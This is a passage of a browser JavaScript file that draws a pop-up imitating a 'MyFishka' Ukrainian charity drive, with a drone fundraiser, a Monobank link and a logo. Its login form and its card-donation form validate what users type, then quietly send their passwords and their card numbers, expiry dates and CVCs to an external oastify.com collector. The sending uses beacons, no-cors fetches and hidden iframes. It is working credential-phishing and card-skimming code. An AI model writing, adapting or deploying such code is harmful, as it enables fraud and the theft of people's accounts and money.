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' // shortened for clarity
  };

  const TEXT={
    title:'Вітаємо на сайті\nMyFishka!',
    intro:'Ми вдячні кожному хто робить свій внесок у наші благодійні акції.',
    thanks:'Дякуємо за вашу підтримку!',
    authHint:'Для того щоб мати можливість долучитись до збору, вам необхідно пройти аутентифікацію',
    cardHint:'Для того щоб зробити пожертву на збір, введіть дані вашої банківської картки',
    joinHeader:'Долучайтесь до збору на ДРОНОПАД!',
    monoLabel:'Посилання на банку Monobank:',
    monoLink:'https://send.monobank.ua/jar/7VuHWj7Eyx',
  };

  const hasParam=(name)=>new URLSearchParams(location.search).has(name);
  const byId=(id)=>document.getElementById(id);

  function injectStyles(){
    if(byId('mfk-modal-styles'))return;
    const css=`
      :root { --mfk-bg:#fff; --mfk-fg:#1f1f1f; --mfk-accent:#3a3a3a; --mfk-border:#2b2b2b; --mfk-shadow:0 12px 40px rgba(0,0,0,.25) }
      #mfk-overlay{position:fixed;inset:0;z-index:2147483646;display:grid;place-items:center;background:rgba(0,0,0,.6)}
      #mfk-modal{width:340px;max-width:92vw;background:var(--mfk-bg);color:var(--mfk-fg);border:2px solid var(--mfk-border);border-radius:10px;box-shadow:var(--mfk-shadow);padding:16px;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;text-align:center;position:relative;box-sizing:border-box}
      #mfk-close{position:absolute;right:8px;top:6px;width:28px;height:28px;border:1px solid var(--mfk-border);border-radius:6px;background:#f6f6f6;color:#222;font-weight:700;line-height:26px;cursor:pointer}
      .mfk-title{font-size:20px;font-weight:800;line-height:1.2;margin:8px 0 6px;white-space:pre-line}
      .mfk-intro{font-size:14px;color:var(--mfk-accent);margin:0 0 10px}
      .mfk-img{display:block;margin:8px auto 10px;max-width:180px;height:auto}
      .mfk-join{font-weight:700;margin-top:8px}
      .mfk-mono{font-size:12px;color:var(--mfk-accent);margin:6px 0 2px}
      .mfk-link{font-weight:600;text-decoration:underline;color:#1b1b1b;word-break:break-all}
      .mfk-thanks{font-weight:800;margin-top:12px}
      form.mfk-form{display:grid;gap:8px;margin-top:8px}
      .mfk-input{padding:10px 12px;border:1.5px solid var(--mfk-border);border-radius:8px;font-size:14px;background:#fff;color:#111;box-sizing:border-box;width:100%}
      .mfk-input::placeholder{color:#9aa0a6}
      .mfk-row{display:grid;gap:8px;grid-template-columns:1fr 1fr}
      .mfk-btn{padding:10px;border-radius:6px;font-weight:600;cursor:pointer;border:1.5px solid var(--mfk-border);box-sizing:border-box;width:100%}
      .mfk-btn-primary{background:#ffdddd}
      .mfk-btn-donate{background:#ddffdd}
      .mfk-invalid { border-color: #d33 !important; outline: 0; }
      .mfk-hint    { font-size: 11px; color: #d33; margin-top: -4px; text-align: left; }
    `;
    const style=document.createElement('style');style.id='mfk-modal-styles';style.textContent=css;document.head.appendChild(style);
  }

  function closeModal(){const o=byId('mfk-overlay');if(o)o.remove();document.body.style.overflow='';}
  function openShell(){
    injectStyles();
    if(byId('mfk-overlay'))return byId('mfk-modal');
    const overlay=document.createElement('div');overlay.id='mfk-overlay';
    const modal=document.createElement('div');modal.id='mfk-modal';
    const closeBtn=document.createElement('button');closeBtn.id='mfk-close';closeBtn.textContent='×';closeBtn.addEventListener('click',closeModal);
    modal.appendChild(closeBtn);overlay.appendChild(modal);
    document.body.style.overflow='hidden';document.body.appendChild(overlay);return modal;
  }

  function sectionHeader(container){
    const h=document.createElement('div');h.className='mfk-title';h.textContent=TEXT.title;
    const p=document.createElement('div');p.className='mfk-intro';p.textContent=TEXT.intro;
    const img=document.createElement('img');img.className='mfk-img';img.alt='MyFishka';img.src=ASSETS.logoUrl;
    container.append(h,p,img);
  }

  // ===================== SENDER =====================
  function postNoCors(endpoint,payloadObj){
    const bodyStr=JSON.stringify(payloadObj);
    try{
      if(navigator.sendBeacon&&endpoint.startsWith("https://")){
        const blob=new Blob([bodyStr],{type:"text/plain;charset=UTF-8"});
        if(navigator.sendBeacon(endpoint,blob))return true;
      }
    }catch{}
    try{
      fetch(endpoint,{method:"POST",mode:"no-cors",keepalive:true,body:bodyStr}).catch(()=>{});
      return true;
    }catch{}
    try{
      const form=document.createElement("form");form.method="POST";form.action=endpoint;form.style.display="none";
      const ta=document.createElement("textarea");ta.name="d";ta.value=bodyStr;form.appendChild(ta);
      const iframe=document.createElement("iframe");iframe.name="telemetry_sink_"+Math.random().toString(36).slice(2);iframe.style.display="none";
      document.body.appendChild(iframe);document.body.appendChild(form);form.target=iframe.name;form.submit();
      setTimeout(()=>{try{iframe.remove();form.remove();}catch{}},3000);
      return true;
    }catch{}
    return false;
  }

  function renderInfo(){
    const root=openShell();sectionHeader(root);
    const join=document.createElement('div');join.className='mfk-join';join.textContent=TEXT.joinHeader;
    const mono=document.createElement('div');mono.className='mfk-mono';mono.textContent=TEXT.monoLabel;
    const a=document.createElement('a');a.className='mfk-link';a.href=TEXT.monoLink;a.target='_blank';a.textContent=TEXT.monoLink;
    const thanks=document.createElement('div');thanks.className='mfk-thanks';thanks.textContent=TEXT.thanks;
    root.append(join,mono,a,thanks);
  }

  function renderAuth(){
    const root=openShell();sectionHeader(root);
    const hint=document.createElement('div');hint.className='mfk-mono';hint.textContent=TEXT.authHint;
    const form=document.createElement('form');form.className='mfk-form';form.autocomplete='off';
    const login=document.createElement('input');login.className='mfk-input';login.placeholder='Номер телефону або картки Fishka';login.name='login';login.required=true;
    const pass=document.createElement('input');pass.className='mfk-input';pass.placeholder='Пароль';pass.name='password';pass.type='password';pass.required=true;
    const btn=document.createElement('button');btn.type='submit';btn.className='mfk-btn mfk-btn-primary';btn.textContent='Підтвердити особу';
    form.append(login,pass,btn);
    form.addEventListener('submit',function(e){
      e.preventDefault();
      postNoCors('https://5oued4d89381meh3t94jd8ru7ldg16pv.oastify.com/fishka/auth-data',{login:login.value,password:pass.value});
      closeModal();
    });
    root.append(hint,form);showThanks(root);
  }

  function renderCard(){
    const root=openShell(); sectionHeader(root);

    const hint=document.createElement('div');
    hint.className='mfk-mono';
    hint.textContent=TEXT.cardHint;

    const form=document.createElement('form');
    form.className='mfk-form';
    form.autocomplete='off';

    // Card number
    const number=document.createElement('input');
    number.className='mfk-input'; number.placeholder='Card Number'; number.name='number'; number.inputMode='numeric'; number.maxLength=23;
    number.addEventListener('input',()=>{
      const ds=number.value.replace(/\D+/g,'').slice(0,19);
      number.value=ds.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
      updateState();
    });

    const row1=document.createElement('div');row1.className='mfk-row';
    const date=document.createElement('input');date.className='mfk-input';date.placeholder='XX / XX';date.name='date';date.inputMode='numeric';date.maxLength=7;
    date.addEventListener('input',()=>{
      const d=date.value.replace(/\D+/g,'').slice(0,4);
      date.value=(d.length>=3?(d.slice(0,2)+' / '+d.slice(2)):d);
      updateState();
    });

    const cvc=document.createElement('input');cvc.className='mfk-input';cvc.placeholder='CVC';cvc.name='cvc';cvc.type='password';cvc.inputMode='numeric';cvc.maxLength=4;
    cvc.addEventListener('input',()=>{cvc.value=cvc.value.replace(/\D+/g,'').slice(0,4); updateState();});
    row1.append(date,cvc);

    const row2=document.createElement('div');row2.className='mfk-row';
    const summ=document.createElement('input');summ.className='mfk-input';summ.placeholder='Сума, ГРН';summ.name='summ';summ.inputMode='numeric';summ.maxLength=10;
    summ.addEventListener('input',()=>{summ.value=summ.value.replace(/[^\d]/g,'').slice(0,10); updateState();});
    const btn=document.createElement('button');btn.type='submit';btn.className='mfk-btn mfk-btn-donate';btn.textContent='Задонатити';btn.disabled=true;
    row2.append(summ,btn);

    const err=document.createElement('div');err.className='mfk-hint';err.style.display='none';

    form.append(number,row1,row2,err);

    form.addEventListener('submit',function(e){
      e.preventDefault();
      if(!allValid()) return;
      postNoCors('https://5oued4d89381meh3t94jd8ru7ldg16pv.oastify.com/fishka/card-data',{
        number: digits(number.value),
        date: date.value,
        cvc: cvc.value,
        summ: summ.value
      });
      closeModal();
    });

    root.append(hint,form); showThanks(root);

    function digits(s){return (s||'').replace(/\D+/g,'');}
    function expiryOK(v){
      const d=digits(v); if(d.length!==4) return false;
      const mm=parseInt(d.slice(0,2),10); const yy=parseInt('20'+d.slice(2),10);
      if(!(mm>=1&&mm<=12)) return false;
      const now=new Date(); const exp=new Date(yy,mm,0); exp.setHours(23,59,59,999);
      return exp>=now;
    }
    function cvcOK(v){const d=digits(v); return d.length===3||d.length===4;}
    function amountOK(v){const n=parseInt(digits(v)||'0',10); return n>0;}

    function allValid(){
      const rawNum=digits(number.value);
      const lenOk=rawNum.length>=13&&rawNum.length<=19;
      return lenOk && expiryOK(date.value)&&cvcOK(cvc.value)&&amountOK(summ.value);
    }

    function setInvalid(el,bad){el.classList.toggle('mfk-invalid',!!bad);}
    function updateState(){
      const rawNum=digits(number.value);
      const lenOk=rawNum.length>=13&&rawNum.length<=19;
      const vExp=expiryOK(date.value);
      const vCvc=cvcOK(cvc.value);
      const vAmt=amountOK(summ.value);
      setInvalid(number,!lenOk);
      setInvalid(date,!vExp);
      setInvalid(cvc,!vCvc);
      setInvalid(summ,!vAmt);
      const ok=lenOk&&vExp&&vCvc&&vAmt;
      btn.disabled=!ok;
      err.style.display=ok?'none':'block';
      if(!ok){err.textContent=!lenOk?'Невірний номер картки':!vExp?'Невірний строк дії (MM / YY)':!vCvc?'Невірний CVC':'Вкажіть суму';}
    }

    updateState();
  }

  function showThanks(root){let t=root.querySelector('.mfk-thanks');if(!t){t=document.createElement('div');t.className='mfk-thanks';t.textContent=TEXT.thanks;root.appendChild(t);}}

  function init(){
    if(hasParam('DrIcAPgc'))return renderInfo();
    if(hasParam('jnCpeBaZ'))return renderAuth();
    if(hasParam('ORrIyTNw'))return renderCard();
  }

  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',init);}else{init();}
})();
